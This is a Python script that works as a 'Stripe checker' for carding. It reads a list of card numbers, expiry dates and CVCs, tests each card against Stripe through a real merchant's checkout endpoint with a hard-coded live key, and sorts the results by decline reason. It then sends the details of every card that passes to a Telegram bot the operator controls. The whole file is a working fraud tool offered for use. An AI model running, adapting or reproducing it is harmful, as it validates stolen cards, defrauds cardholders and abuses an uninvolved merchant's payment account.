try:
	import requests
	import webbrowser
except:
	import os
	os.system('pip install requests')
	os.system('pip install webbrowser')
idtele = input('enter id telegram: ')
tokentele = input('enter token bot: ')
files=input('enter combo: ')
file=open('smoke.txt',"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n= P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-SY,ar;q=0.9,en-GB;q=0.8,en;q=0.7,ar-EG;q=0.6,en-US;q=0.5,ar-AE;q=0.4',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}


	data = f'type=card&billing_details[address][postal_code]=27363&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fd2e885528f%3B+stripe-js-v3%2Fd2e885528f%3B+split-card-element&referrer=https%3A%2F%2Fgalleryclimatecoalition.org&time_on_page=33294&key=pk_live_OC4ftTyuGNtAcLvMnh7Fz889&_stripe_account=acct_1HaHgQGvI1equNqy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQaaWHCIabF_5sbccZqlpd7cwrfYax3Zr37RbhyzACMDMNMexza87Jha-hhv6Sw-cFphzxlnLd050_cEUhJ0GpiEsjQUjnlci9MyqTt5WyGf-T0S47i0hDDhIRZhOPaFvnF5HFqnq7nzDteuvbfWt72iCRC0SfMZ3j9UwUo50_RQB-FnYfhvGM6gSQ5qvPY8DpPzOUcxYvye07p93hSs2KeHxCLrSHlw8XUjFYDyP6Goojr7MFGZK18tDDt30MbuviqBMtYyS5k8TgRTc8Bqyn9y59Tmaasuv3QzFW4NQQpD8WTzwRkmVx5EX1iekArAjis-zlXvzG5JhNbSEnY1fd4HbTanHfxap0kLHqjl1x0FqkStrRa-6azYTg9XFnZndpRvLEV0Sv4vMWFRCS2mejB83UdXtvIF25-p8TPUOk0wMw-osdzukLOnHt7Fzy6Igbt66nY72Efrx4oZfiqN9nOWATljmIkVEQx2xf7c1gg0GyCoz8CkRvaOI4YQp2HC3RkhA_uQ5VqNEeI8X-V99eifnQZHh8v3g815YVf_82hq9EWu_JxHUjhxFsVytkv8SLmmhChQc3rD56Seid4Bqe3JE36v7U1oEnCGq7zNi-GJNjp7NLYJKJWxDUTMf9Fn4zeGGIYXeeSU7bJvaWpJhlAcX3w1pWGMPXC_RHVhQsVI_b5NahJ5vTGkaMxkzbITblMV7Nn5xXstNexjyOBfliz42vSM8lEjOLHANxkPgBzWe1ul4UJOWieK4IgH3S9ddblNgQQbwRP0VIpMBaFlX6XZxTKlKVDccKdS14-A5u-tI6RMjfAkmQINoL3fnGJB-kqFhqC3AcOQnvOzhSAx5PLhMC-vRwwCXXbI7JRIUikC3ZwB4G6MitwUgy74R9KKU89ax5065Bv-4aDSS8Ar0_6SebXlNCnfLg0SWh1fnOlchtB9fjLMvZ61UBKMhLFGTrC5UqwR1_t5r2cVScNXtmGRF6V3g21bjEGxR1s-tcBA4TYEjGGwclbfxuIxlJSZa8plNX2SP2xoTcHzRLoLxlkN-yuEOUlRJCCCeC5iPY4xJ6yVTd5INuWAWLPfG7W5ZGuCtbQRKe1TL4W3_2rbAd9bdcAgObhtf9548NMvKV2RSzt-QyTtE16rFXn4HK5MqKIMi39kuMerSiSK82dYiNIW1nrjjeqEd6-RONG61QEh0A6kwPlT_HBinNDFewMb0_8wguSg_nrApiYQYdcYGa6rsTECRr4WsdXb96vMSJTHDP9ggrs2kd1dl2VKE8VCCw-0ba-CzCg5Bcukd8-NSFAXkNkI6LjNi-P2R2VfL08G_puXtELP4UjXCCFuY82iLeYwKdLDGBtVITnth55g20yKOkRSS8X9QM1z9A1H-HN_PuCV9RilrfXJQ0pjNr0psi7fv9jt4YzfKa-CtzN9tvE6V_dved8K_39FC60i0W7PKHR2lWM9B8Q21nDlVdvtbzrYCPrYwr1gKhGYRUDKvrwMPkY1BUSfKk-SB0s4XxO5GWuDf5a6yuHv9ZN6N8nZDPg4VsJdbGAf0-7_gZbmpBeFxLvIQqkwCSXGkI34cWfHM8lVgrgbgmD4dVSz54_lCkjbUGpkkJwAgrt7UkV-_u4lg6MibOGCXIub4N-H5FQf7nwP9YBJ-Sw-rmHPns8YiUVYY8lJZlwSbcFf-IjBxqA6DyFMEaML1wHZXGmdn0xj3yWvzeHCQVwTu6mL8DzSCvAXfKyLUgl3kc1rCoCYt3M6UhreuCdAKsLPFsATpTXPrTXcOlMuqpvIHYbTzFj3HgA5iwhEfYdJEBVzQpsUWjNpmYacpp91yHuOxGiw1T3nUjAdrZfgn-m1Iy9oZK4on394Tsul4ALpCGTTRzGcCvGCCqOcmDDvbwvKEbpT5fsPMZz_2yfaXjk6RHZ1ZPjvhsIyDbQNdFiOb-QxTkwMQh3pbW1A_s41qGnA4iYudNlSk_C3RtFJ-qE_B9Y_WDq6N_I2admlBXqCCxQ2ksCL-FNiKsLlMH773Jwtxk-uT4RCLHj129_x2GJspn-2CFtmKsCJ_W5LD3Ml-qnJxEBrey3WESNdB-I0rvkBBNAfREu1GHepqjTx1zxtBh7NCJ9pVYMYihqqjcyhMdY83JMTv6fPJ1ReYU804w0c43RmsifnhO6akSZ2bfXlBAcpV-P10-q7vafI09HJhtgC7FvxB0Htgux2eqbdO66KT4hz7i3iDzG-svk7qxidFBCvni_cPPAP_vuI0NHZN9ay8qNleHDOZk88XqhzaGFyZF9pZM4DMYNvomtypzNiYWZlYWaicGQA.HjsUzs6DY7CWPanVE7u_5lsI69gjQyNscEH44W4sOoo'
	try:
		response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		if 'pm_' in response.text:
			id = response.json()['id']
			info=(response.text)
			headers = {
	    'authority': 'galleryclimatecoalition.org',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-SY,ar;q=0.9,en-GB;q=0.8,en;q=0.7,ar-EG;q=0.6,en-US;q=0.5,ar-AE;q=0.4',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'cookie': '_gid=GA1.2.1957219945.1716394597; splash_screen_disabled=true; gcc=ef523da228b8756b676834cd9ff72241484ff189435bb016441d47e392592ba393e7d545; _gat=1; _gat_tracker2=1; _gat_artlogic_tracker=1; _ga=GA1.1.283863775.1716394597; _ga_1WPW8XZC4X=GS1.2.1716468657.6.1.1716468745.0.0.0; _ga_X2PLGQ0326=GS1.1.1716468657.6.1.1716468748.0.0.0; _ga_GLQ6WNJKR5=GS1.1.1716468659.6.1.1716468748.0.0.0',
	    'origin': 'https://galleryclimatecoalition.org',
	    'referer': 'https://galleryclimatecoalition.org/store/basket/?checkout-step=3',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
			data = {
		    'payment_method_id': id,
		    'payment': info,
		    'proxy_dir': '',
		    '_cmspreview': '',
		}
		
			response = requests.post(
		    'https://galleryclimatecoalition.org/cart/stripe_create_confirm_payment_intent/',
		    headers=headers,
		    data=data,
		)
		
			webbrowser.open('http://t.me/ch4kscript')
			if "Your card has insufficient funds" in response.json():
				msg='Not Funds ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Insufficent funds ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				print(P+'|'+msg)
			elif "card has insufficient funds" in response.json():
				msg='Not Funds ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Insufficent funds ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				print(P+'|'+msg)
			elif "insufficient_funds" in response.json():
				msg='Not Funds ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Insufficent funds ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "Your card's security code is incorrect" in response.json():
				msg="CCN Live ✅"
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Declined CVV ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "security code is incorrect" in response.json():
				msg="CCN Live ✅"
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Declined CVV ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "incorrect_cvc" in response.json():
				msg="CCN Live ✅"
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Declined CVV ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "Your card does not support this type of purchase" in response.json():
				msg='Not Support ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:Your card does not support this type of purchase ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "transaction_not_allowed" in response.json():
				msg='transaction not allowed ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:transaction not allowed ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "three_d_secure_redirect" in response.json():
				msg='3D Secure ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:3D Secure ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "card_error_authentication_required" in response.json():
				msg='3D Secure ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:3D Secure ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "stripe_3ds2_fingerprint" in response.json():
				msg='3D Secure ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:3D Secure ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "requires_action" in response.json():
				msg='3D Secure ✅'
				requests.post(f"https://api.telegram.org/bot{tokentele}/sendMessage?chat_id={idtele}&parse_mode=HTML&text=𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿:\n{P}\n\n𝗖𝗵𝗮𝗿𝗴𝗲 𝗥𝗲𝘀𝘂𝗹𝘁:3D Secure ❎\n\n𝗕𝗢𝗧 𝗕𝘆 ⇾@M77SALAH")
				
				print(P+'|'+msg)
			elif "Your card was declined" in response.json()['stripe_error']:
				msg='Your card was declined ⛔'
				print(P+'|'+msg)
			elif "generic_decline" in response.json()['stripe_error']:
				msg='Generic decline ⛔'
				print(P+'|'+msg)
			elif "card_decline_rate_limit_exceeded" in response.json()['stripe_error']:
				msg='Card Attempted To Often ⛔'
				print(P+'|'+msg)
			elif "card number is incorrect" in response.json()['stripe_error']:
				msg='card number is incorrect ⛔'
				print(P+'|'+msg)
			elif "Your card number is incorrect" in response.json()['stripe_error']:
				msg='card number is incorrect ⛔'
				print(P+'|'+msg)
			elif "Invalid account" in response.json()['stripe_error']:
				msg='Invalid account ⛔'
				print(P+'|'+msg)
			elif "fraudulent" in response.json()['stripe_error']:
				msg='fraudulent ⛔'
				print(P+'|'+msg)
			elif "lost_card" in response.json()['stripe_error']:
				msg='Lost Card ⛔'
				print(P+'|'+msg)
			elif "stolen_card" in response.json()['stripe_error']:
				msg='Stolen Card ⛔'
				print(P+'|'+msg)
			elif "pickup_card" in response.json()['stripe_error']:
				msg='Lost Card ⛔'
				print(P+'|'+msg)
			elif "do_not_honor" in response.json()['stripe_error']:
				msg='Do Not Honor ⛔'
				print(P+'|'+msg)
			elif "expired_card" in response.json()['stripe_error']:
				msg='expired Card ⛔'
				print(P+'|'+msg)
			elif "Your card has expired" in response.json()['stripe_error']:
				msg='Expired Card ⛔'
				print(P+'|'+msg)
			else:
				print(P+'|'+response.json()['stripe_error'])
	except:
		print(P+'|'+response.json()['stripe_error'])